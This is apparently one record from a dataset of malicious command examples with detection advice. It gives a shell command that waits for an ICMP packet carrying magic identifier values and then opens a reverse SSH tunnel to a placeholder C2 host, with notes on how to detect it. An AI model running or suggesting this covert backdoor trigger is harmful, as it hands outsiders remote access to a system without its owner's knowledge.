command: sudo timeout 60 tcpdump -ln -i eth0 'icmp and icmp[4:2]=0xbeef and icmp[6:2]=0x1234' -c 1 >/dev/null && ssh -N -R 22022:localhost:22 user@c2.example
explanation: Listens (requires sudo) for a single ICMP echo with magic identifier and sequence values (0xBEEF/0x1234). When observed, establishes a reverse SSH tunnel to a C2, effectively using the ICMP as a covert trigger. Detection: flag tcpdump invocation by non-admin users; IDS for ICMP packets with unusual id/seq patterns; monitor for unsolicited reverse SSH tunnels.
